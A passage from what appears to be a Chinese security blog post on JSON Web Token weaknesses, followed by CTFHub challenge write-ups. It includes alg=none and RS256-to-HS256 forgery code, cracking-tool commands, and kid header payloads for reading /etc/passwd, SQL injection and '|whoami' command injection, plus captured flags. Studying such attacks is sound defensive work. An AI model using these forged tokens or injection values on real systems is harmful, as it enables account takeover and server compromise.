class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>生成的完整token为<code>ew0KCSJhbGciIDogIk5vbmUiLA0KCSJ0eXAiIDogImp3dCINCn0.ew0KCSJ1c2VyIiA6ICJBZG1pbiINCn0</code></p>\n<p>(header+’.’+payload，去掉了’.’+signature字段)</p>\n<p>空加密算法的设计初衷是用于调试的，在生产环境中开启了空加密算法，缺少签名算法，jwt保证信息不被篡改的功能就失效了。攻击者只需要把alg字段设置为None，就可以在payload中构造身份信息，伪造用户身份。</p>\n<h5 id=\"RSA改为HMAC\"><a href=\"#RSA改为HMAC\" class=\"headerlink\" title=\"RSA改为HMAC\"></a>RSA改为HMAC</h5><p>JWT中最常用的两种算法为<code>HMAC</code>和<code>RSA</code>。</p>\n<p><code>HMAC</code>是密钥相关的哈希运算消息认证码（Hash-based Message Authentication Code）的缩写，它是一种对称加密算法，使用相同的密钥对传输信息进行加解密。</p>\n<p><code>RSA</code>则是一种非对称加密算法，使用私钥加密明文，公钥解密密文。</p>\n<p>在HMAC和RSA算法中，都是使用私钥对<code>signature</code>字段进行签名，只有拿到了加密时使用的私钥，才有可能伪造token。</p>\n<p>现在我们假设有这样一种情况，一个Web应用，在JWT传输过程中使用RSA算法，密钥<code>pem</code>对JWT token进行签名，公钥<code>pub</code>对签名进行验证。</p>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"attr\">&quot;alg&quot;</span> : <span class=\"string\">&quot;RS256&quot;</span>,</span><br><span class=\"line\">    <span class=\"attr\">&quot;typ&quot;</span> : <span class=\"string\">&quot;jwt&quot;</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>通常情况下密钥<code>pem</code>是无法获取到的，但是公钥<code>pub</code>却可以很容易通过某些途径读取到，这时，将JWT的加密算法修改为HMAC，即</p>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"attr\">&quot;alg&quot;</span> : <span class=\"string\">&quot;HS256&quot;</span>,</span><br><span class=\"line\">    <span class=\"attr\">&quot;typ&quot;</span> : <span class=\"string\">&quot;jwt&quot;</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>同时使用获取到的公钥<code>pub</code>作为算法的密钥，对token进行签名，发送到服务器端。</p>\n<p>服务器端会将RSA的公钥（<code>pub</code>）视为当前算法（HMAC）的密钥，使用HS256算法对接收到的签名进行验证。</p>\n<p><code>https://skysec.top/2018/05/19/2018CUMTCTF-Final-Web/#Pastebin/</code></p>\n<h4 id=\"密钥暴破\"><a href=\"#密钥暴破\" class=\"headerlink\" title=\"密钥暴破\"></a>密钥暴破</h4><p>暴破基础</p>\n<ul>\n<li>知悉JWT使用的加密算法</li>\n<li>一段有效的、已签名的token</li>\n<li>签名用的密钥不复杂（弱密钥）</li>\n</ul>\n<p>因此局限性还是较大</p>\n<p>工具参考如下：JWT-Tools</p>\n<p>简单的组合爆破起来相对较简单，一旦复杂起来将很难再进行实施爆破。</p>\n<h4 id=\"修改KID参数\"><a href=\"#修改KID参数\" class=\"headerlink\" title=\"修改KID参数\"></a>修改KID参数</h4><p><code>kid</code>是jwt header中的一个可选参数，全称是<code>key ID</code>，它用于指定加密算法的密钥</p>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"attr\">&quot;alg&quot;</span> : <span class=\"string\">&quot;HS256&quot;</span>,</span><br><span class=\"line\">    <span class=\"attr\">&quot;typ&quot;</span> : <span class=\"string\">&quot;jwt&quot;</span>,</span><br><span class=\"line\">    <span class=\"attr\">&quot;kid&quot;</span> : <span class=\"string\">&quot;/home/jwt/.ssh/pem&quot;</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>因为该参数可以由用户输入，因此也可能造成一些安全问题。</p>\n<h5 id=\"任意文件读取\"><a href=\"#任意文件读取\" class=\"headerlink\" title=\"任意文件读取\"></a>任意文件读取</h5><p><code>kid</code>参数用于读取密钥文件，但系统并不会知道用户想要读取的到底是不是密钥文件，因此，如果在没有对参数进行过滤的前提下，攻击者是可以读取到系统的任意文件的。</p>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"attr\">&quot;alg&quot;</span> : <span class=\"string\">&quot;HS256&quot;</span>,</span><br><span class=\"line\">    <span class=\"attr\">&quot;typ&quot;</span> : <span class=\"string\">&quot;jwt&quot;</span>,</span><br><span class=\"line\">    <span class=\"attr\">&quot;kid&quot;</span> : <span class=\"string\">&quot;/etc/passwd&quot;</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"SQL注入\"><a href=\"#SQL注入\" class=\"headerlink\" title=\"SQL注入\"></a>SQL注入</h5><p><code>kid</code>也可以从数据库中提取数据，这时候就有可能造成SQL注入攻击，通过构造SQL语句来获取数据或者是绕过signature的验证。</p>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"attr\">&quot;alg&quot;</span> : <span class=\"string\">&quot;HS256&quot;</span>,</span><br><span class=\"line\">    <span class=\"attr\">&quot;typ&quot;</span> : <span class=\"string\">&quot;jwt&quot;</span>,</span><br><span class=\"line\">    <span class=\"attr\">&quot;kid&quot;</span> : <span class=\"string\">&quot;key11111111&#x27; || union select &#x27;secretkey&#x27; -- &quot;</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"命令执行\"><a href=\"#命令执行\" class=\"headerlink\" title=\"命令执行\"></a>命令执行</h5><p>对<code>kid</code>参数过滤不严也可能会出现命令注入问题，但是利用条件比较苛刻。如果服务器后端使用的是Ruby，在读取密钥文件时使用了<code>open</code>函数，通过构造参数就可能造成命令注入。</p>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&quot;/path/to/key_file|whoami&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>对于其他的语言，例如php，如果代码中使用的是<code>exec</code>或者是<code>system</code>来读取密钥文件，那么同样也可以造成命令注入，当然这个可能性就比较小了。</p>\n<h4 id=\"修改JKU-X5U\"><a href=\"#修改JKU-X5U\" class=\"headerlink\" title=\"修改JKU/X5U\"></a>修改JKU/X5U</h4><p><code>JKU</code>的全称是”JSON Web Key Set URL”，用于指定一组用于验证令牌的密钥的URL。类似于<code>kid</code>，<code>JKU</code>也可以由用户指定输入数据，如果没有经过严格过滤，就可以指定一组自定义的密钥文件，并指定web应用使用该组密钥来验证token。</p>\n<p><code>X5U</code>则以URI的形式数允许攻击者指定用于验证令牌的<strong>公钥证书或证书链</strong>，与<code>JKU</code>的攻击利用方式类似。</p>\n<h4 id=\"信息泄漏\"><a href=\"#信息泄漏\" class=\"headerlink\" title=\"信息泄漏\"></a>信息泄漏</h4><p>JWT保证的是数据传输过程中的完整性而不是机密性。</p>\n<p>由于payload是使用<code>base64url</code>编码的，所以相当于明文传输，如果在payload中携带了敏感信息（如存放密钥对的文件路径），单独对payload部分进行<code>base64url</code>解码，就可以读取到payload中携带的信息。</p>\n<h3 id=\"JWT-Tools\"><a href=\"#JWT-Tools\" class=\"headerlink\" title=\"JWT Tools\"></a>JWT Tools</h3><p><a href=\"https://github.com/brendan-rius/c-jwt-cracker\">JWT爆破</a></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git clone https://github.com/brendan-rius/c-jwt-cracker.git</span><br><span class=\"line\">cd c-jwt-cracker</span><br><span class=\"line\">brew install openssl</span><br><span class=\"line\">make OPENSSL=/usr/local/opt/openssl/include OPENSSL_LIB=-L/usr/local/opt/openssl/lib</span><br><span class=\"line\">./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.cAOIAifu3fykvhkHpbuhbvtH807-Z2rI1FS3vX1XMjE</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/jwt/image-20201020161036706.png\" alt=\"image-20201020161036706\"></p>\n<p>JWT在线工具</p>\n<p><a href=\"https://jwt.io/\">JWT Online</a></p>\n<p><a href=\"https://github.com/ticarpi/jwt_tool\">JWT_Tool</a></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pip3 install pycryptodomex</span><br><span class=\"line\">py3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IjEiLCJwYXNzd29yZCI6IjEiLCJyb2xlIjoiZ3Vlc3QifQ.dkimTl0KydTeIHQ1UvhjAK7FPfArIkgf8XWp7VsKZyE</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/jwt/image-20201021113441020.png\" alt=\"image-20201021113441020\"></p>\n<p><img src=\"/images/jwt/image-20201021113549915.png\" alt=\"image-20201021113549915\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. 修改JWT</span><br><span class=\"line\">2. 生成None算法的JWT</span><br><span class=\"line\">3. 检查RS/HS256公钥错误匹配漏洞</span><br><span class=\"line\">4. 检测JKU密钥是否可伪造</span><br><span class=\"line\">5. 输入一个key,检查是否正确</span><br><span class=\"line\">6. 输入一个存放key的文本，检查是否正确</span><br><span class=\"line\">7. 输入字典文本，爆破</span><br><span class=\"line\">8. 输入RSA公钥，检查是否正确</span><br></pre></td></tr></table></figure>\n\n<p>\u001c交互工具</p>\n<p>主要针对<code>alg</code>被致None，因在线工具无法修改为None，所以需要使用交互方式来获取token。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python</span><br><span class=\"line\">import jwt</span><br><span class=\"line\">jwt.encode(payload)</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h3 id=\"JWT攻击\"><a href=\"#JWT攻击\" class=\"headerlink\" title=\"JWT攻击\"></a>JWT攻击</h3><p>以下题目参考<a href=\"https://www.ctfhub.com/\">ctfhub</a>中关于JWT的CTF试题学习并练习；算法修改并未得到flag。</p>\n<h4 id=\"题一：信息泄漏\"><a href=\"#题一：信息泄漏\" class=\"headerlink\" title=\"题一：信息泄漏\"></a>题一：信息泄漏</h4><p>题目提示信息：敏感信息泄漏</p>\n<p><img src=\"/images/jwt/image-20201020175137207.png\" alt=\"image-20201020175137207\"></p>\n<p>访问URL</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;challenge-f0ba92c933a7d9be.sandbox.ctfhub.com:10080&#x2F;</span><br></pre></td></tr></table></figure>\n\n<p>提示输入用户名及密码</p>\n<p><img src=\"/images/jwt/image-20201020175233885.png\" alt=\"image-20201020175233885\"></p>\n<p>观察响应数据</p>\n<p><img src=\"/images/jwt/image-20201020175334255.png\" alt=\"image-20201020175334255\"></p>\n<p>发现Cookie属于JWT</p>\n<p><img src=\"/images/jwt/image-20201020175407427.png\" alt=\"image-20201020175407427\"></p>\n<p>复制并提交在线工具</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">eyJBRyI6ImI5MmNlNzk1NDg4ZTZjMDExNjBmNjU4fSIsInR5cCI6IkpXVCIsImFsZyI6IkhTMjU2In0.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiJhZG1pbiIsIkZMIjoiY3RmaHViezA1OGFiZjNiM2IwZTlkOGQ1In0._TNIAg9rDfqtOFejHiIz9tXyJ7-hGqsKlJudTfXYZtw</span><br><span class=\"line\"></span><br><span class=\"line\"># 解码后由下图得知，flag只有一半，但是另一半在header中保存，拼接即可。</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/jwt/image-20201020175507938.png\" alt=\"image-20201020175507938\"></p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ctfhub&#123;058abf3b3b0e9d8d5b92ce795488e6c01160f658&#125;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"题二：None\"><a href=\"#题二：None\" class=\"headerlink\" title=\"题二：None\"></a>题二：None</h4><p>题目提示：JWT支持None，并且后端不执行签名验证。</p>\n<p><img src=\"/images/jwt/image-20201020192649086.png\" alt=\"image-20201020192649086\"></p>\n<p>访问URL</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;challenge-9f380c0d9554b48b.sandbox.ctfhub.com:10080&#x2F;login.php</span><br></pre></td></tr></table></figure>\n\n<p>admin/admin登录：提示只有admin才能获得flag值。</p>\n<p><img src=\"/images/jwt/image-20201020192750143.png\" alt=\"image-20201020192750143\"></p>\n<p><img src=\"/images/jwt/image-20201020192907650.png\" alt=\"image-20201020192907650\"></p>\n<p>获取登录token并进行在线解码处理</p>\n<p>分别对header、payload进行解码修改对应值并编码处理。</p>\n<p><img src=\"/images/jwt/image-20201021110733681.png\" alt=\"image-20201021110733681\"></p>\n<p><img src=\"/images/jwt/image-20201021110753552.png\" alt=\"image-20201021110753552\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 因后台不进行签名验证了，因此可直接替换对应值即可绕过。</span><br><span class=\"line\"># 因在线网站无法修改none，因此这里使用python的交互来获取token如下：</span><br><span class=\"line\">&#123;&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;none&quot;&#125;</span><br><span class=\"line\">&#123;&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;1&quot;,&quot;role&quot;:&quot;admin&quot;&#125;</span><br><span class=\"line\">jwt.encode(&#123;&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;1&quot;,&quot;role&quot;:&quot;admin&quot;&#125;,algorithm&#x3D;&quot;none&quot;,key&#x3D;&quot;&quot;)</span><br><span class=\"line\">eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiIxIiwicm9sZSI6ImFkbWluIn0.</span><br></pre></td></tr></table></figure>\n\n<p>用none算法生成的JWT只有两部分了，根本连签名都不存在。</p>\n<p><img src=\"/images/jwt/image-20201021144848195.png\" alt=\"image-20201021144848195\"></p>\n<p>替换token，重放后可得到flag值</p>\n<p><img src=\"/images/jwt/image-20201021110552087.png\" alt=\"image-20201021110552087\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ctfhub&#123;adcd547cd87ee1536fba1a7fe530a8d9719e9ee3&#125;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"题三：弱密码\"><a href=\"#题三：弱密码\" class=\"headerlink\" title=\"题三：弱密码\"></a>题三：弱密码</h4><p>由题目得知：JWT采用对称加密算法，如果密钥的强度较弱的话，会被爆破攻击。</p>\n<p><img src=\"/images/jwt/image-20201020201008964.png\" alt=\"image-20201020201008964\"></p>\n<p>访问URL</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;challenge-97dc1d0c313c1266.sandbox.ctfhub.com:10080&#x2F;login.php</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/jwt/image-20201020201106689.png\" alt=\"image-20201020201106689\"></p>\n<p>admin/admin</p>\n<p><img src=\"/images/jwt/image-20201020201132629.png\" alt=\"image-20201020201132629\"></p>\n<p>获取JWT的token</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IjEiLCJwYXNzd29yZCI6IjEiLCJyb2xlIjoiZ3Vlc3QifQ.dkimTl0KydTeIHQ1UvhjAK7FPfArIkgf8XWp7VsKZyE</span><br></pre></td></tr></table></figure>\n\n<p>使用工具进行爆破得到密钥</p>\n<p><img src=\"/images/jwt/image-20201021111740982.png\" alt=\"image-20201021111740982\"></p>\n<p>修改对应值并获得最新的token</p>\n<p><img src=\"/images/jwt/image-20201021111921365.png\" alt=\"image-20201021111921365\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ctfhub&#123;11f50e22266935854562ba365e25aabd719a7cc3&#125;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"题四：修改签名算法\"><a href=\"#题四：修改签名算法\" class=\"headerlink\" title=\"题四：修改签名算法\"></a>题四：修改签名算法</h4><p>题目：修改签名算法完成绕过;</p>\n<p><img src=\"/images/jwt/image-20201021112611069.png\" alt=\"image-20201021112611069\"></p>\n<p>访问URL</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;challenge-9fc2bbd399072286.sandbox.ctfhub.com:10080&#x2F;</span><br></pre></td></tr></table></figure>\n\n<p>登录入口信息及部分php提示</p>\n<p><img src=\"/images/jwt/image-20201021141803090.png\" alt=\"image-20201021141803090\"></p>\n<p>提示如下：主要关注点下面，主要是对JWT算法并绕过获得flag。</p>\n<p><img src=\"/images/jwt/image-20201021141738055.png\" alt=\"image-20201021141738055\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;admin&quot;,&quot;role&quot;:&quot;admin&quot;&#125;</span><br><span class=\"line\">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.LURZ-AAb42YweV6rAylSGFB19J5A3dbTMQw0TieJ3u8</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pip install pyjwt</span><br><span class=\"line\"></span><br><span class=\"line\">import jwt</span><br><span class=\"line\">import base64</span><br><span class=\"line\">public &#x3D; open(&#39;1.pem&#39;, &#39;r&#39;).read()</span><br><span class=\"line\">print jwt.encode(&#123;&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;admin&quot;,&quot;role&quot;:&quot;admin&quot;&#125;, key&#x3D;public, algorithm&#x3D;&#39;HS256&#39;)</span><br></pre></td></tr></table></figure>\n\n<p><code>未获取flag！！！</code></p>\n<h3 id=\"Referer\"><a href=\"#Referer\" class=\"headerlink\" title=\"Referer\"></a>Referer</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;6776</span><br><span class=\"line\">https:&#x2F;&#x2F;cyberpolygon.com&#x2F;materials&#x2F;security-of-json-web-tokens-jwt&#x2F;</span><br><span class=\"line\">https:&#x2F;&#x2F;medium.com&#x2F;swlh&#x2F;hacking-json-web-tokens-jwts-9122efe91e4a</span><br><span class=\"line\">JWT绕过CTF</span><br><span class=\"line\">https:&#x2F;&#x2F;delcoding.github.io&#x2F;2018&#x2F;03&#x2F;jwt-bypass&#x2F;</span><br><span class=\"line\">https:&#x2F;&#x2F;www.ctfhub.com&#x2F;</span><br><span class=\"line\">https:&#x2F;&#x2F;www.slideshare.net&#x2F;OWASP_Poland&#x2F;opd-2019-attacking-jwt-tokens</span><br></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"","more":"<p><img src=\"/images/jwt/1_XkmnsJ6Joa6EDFVGUw0tfA.png\" alt=\"1_XkmnsJ6Joa6EDFVGUw0tfA\"></p>\n<h3 id=\"JWT概述\"><a href=\"#JWT概述\" class=\"headerlink\" title=\"JWT概述\"></a>JWT概述</h3><p><code>JWT</code>的全称是<code>JSON Web Token</code>。遵循JSON格式，跨域认证解决方案。声明被存储在<code>客户端</code>，而不是服务端内存中。服务器不保存任何用户信息，只保存密钥信息，通过使用特定加密算法验证token，通过token验证用户身份。基于token的身份验证可以替代传统的cookie+session身份验证方法。</p>\n<h3 id=\"传统认证\"><a href=\"#传统认证\" class=\"headerlink\" title=\"传统认证\"></a>传统认证</h3><h4 id=\"Cookie\"><a href=\"#Cookie\" class=\"headerlink\" title=\"Cookie\"></a>Cookie</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HTTP 是无状态协议，它不对之前发生过的请求和响应的状态进行管理。也就是说，无法根据之前的状态进行本次的请求处理。</span><br><span class=\"line\"></span><br><span class=\"line\">假设要求登录认证的 Web 页面本身无法进行状态的管理（不记录已登录的状态），那么每次跳转新页面不是要再次登录，就是要在每次请求报文中附加参数来管理登录状态。</span><br><span class=\"line\"></span><br><span class=\"line\">不可否认，无状态协议当然也有它的优点。由于不必保存状态，自然可减少服务器的 CPU 及内存资源的消耗。从另一侧面来说，也正是因为 HTTP 协议本身是非常简单的，所以才会被应用在各种场景里。</span><br><span class=\"line\"></span><br><span class=\"line\">保留无状态协议这个特征的同时又要解决类似的矛盾问题，于是引入了 Cookie 技术。Cookie 技术通过在请求和响应报文中写入 Cookie 信息来控制客户端的状态。</span><br><span class=\"line\"></span><br><span class=\"line\">Cookie 会根据从服务器端发送的响应报文内的一个叫做 Set-Cookie 的首部字段信息，通知客户端保存 Cookie。当下次客户端再往该服务器发送请求时，客户端会自动在请求报文中加入 Cookie 值后发送出去。</span><br><span class=\"line\"></span><br><span class=\"line\">服务器端发现客户端发送过来的 Cookie 后，会去检查究竟是从哪一个客户端发来的连接请求，然后对比服务器上的记录，最后得到之前的状态信息。”</span><br></pre></td></tr></table></figure>\n\n<p>摘录来自: 上野宣、于均良. “图解HTTP”。 </p>\n<h3 id=\"JWT组成\"><a href=\"#JWT组成\" class=\"headerlink\" title=\"JWT组成\"></a>JWT组成</h3><p>JWT由三部分组成：<code>header</code>、<code>payload</code>、<code>signature</code></p>\n<h4 id=\"header\"><a href=\"#header\" class=\"headerlink\" title=\"header\"></a>header</h4><p>header部分最常用的两个字段是<code>alg</code>和<code>typ</code>，<code>alg</code>指定了token加密使用的算法（最常用的为<code>HMAC</code>和<code>RSA</code>算法），<code>typ</code>声明类型为JWT</p>\n<p>header类似如下：</p>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"attr\">&quot;alg&quot;</span>: <span class=\"string\">&quot;HS256&quot;</span>,</span><br><span class=\"line\">  <span class=\"attr\">&quot;typ&quot;</span>: <span class=\"string\">&quot;JWT&quot;</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"payload\"><a href=\"#payload\" class=\"headerlink\" title=\"payload\"></a>payload</h4><p>payload则为用户数据以及一些元数据有关的声明，用以声明权限，举个例子，一次登录的过程可能会传递以下数据：</p>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"attr\">&quot;user_role&quot;</span> : <span class=\"string\">&quot;finn&quot;</span>,    \t<span class=\"comment\">//当前登录用户</span></span><br><span class=\"line\">    <span class=\"attr\">&quot;iss&quot;</span>: <span class=\"string\">&quot;admin&quot;</span>,          \t<span class=\"comment\">//该JWT的签发者,有些是URL</span></span><br><span class=\"line\">    <span class=\"attr\">&quot;iat&quot;</span>: <span class=\"number\">1573440582</span>,        <span class=\"comment\">//签发时间</span></span><br><span class=\"line\">    <span class=\"attr\">&quot;exp&quot;</span>: <span class=\"number\">1573940267</span>,        <span class=\"comment\">//过期时间</span></span><br><span class=\"line\">    <span class=\"attr\">&quot;nbf&quot;</span>: <span class=\"number\">1573440582</span>,        <span class=\"comment\">//该时间之前不接收处理该Token</span></span><br><span class=\"line\">    <span class=\"attr\">&quot;domain&quot;</span>: <span class=\"string\">&quot;example.com&quot;</span>,   <span class=\"comment\">//面向的用户</span></span><br><span class=\"line\">    <span class=\"attr\">&quot;jti&quot;</span>: <span class=\"string\">&quot;dff4214121e83057655e10bd9751d657&quot;</span>   <span class=\"comment\">//Token唯一标识</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h4 id=\"signature\"><a href=\"#signature\" class=\"headerlink\" title=\"signature\"></a>signature</h4><p>signature的功能是保护token完整性；生成方式是将header和payload两个部分链接，然后通过header部分指定的<code>算法</code>，计算签名。</p>\n<p>抽象成公式就是</p>\n<p><code>signature = HMAC-SHA256(base64urlEncode(header) + &#39;.&#39; + base64urlEncode(payload), secret_key</code></p>\n<p><code>注意：</code>编码header和payload时使用的编码方式为<code>base64urlencode</code>，<code>base64url</code>编码是<code>base64</code>的修改版，为了方便在网络中传输使用了不同的编码表，它不会在末尾填充”=”号，并将标准Base64中的”+”和”/“分别改成了”-“和”-“。</p>\n<h3 id=\"JWT安全\"><a href=\"#JWT安全\" class=\"headerlink\" title=\"JWT安全\"></a>JWT安全</h3><p>一个完整的jwt格式为(<code>header</code>.<code>payload</code>.<code>signature</code>)，其中header、payload使用<code>base64url</code>编码，signature通过指定算法生成。</p>\n<h4 id=\"加密算法\"><a href=\"#加密算法\" class=\"headerlink\" title=\"加密算法\"></a>加密算法</h4><h5 id=\"空加密算法\"><a href=\"#空加密算法\" class=\"headerlink\" title=\"空加密算法\"></a>空加密算法</h5><p>JWT支持使用空加密算法，可以在header中指定alg为<code>None</code></p>\n<p>这样的话，只要把signature设置为空（即不添加signature字段），提交到服务器，任何token都可以通过服务器的验证。如下：</p>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"attr\">&quot;alg&quot;</span> : <span 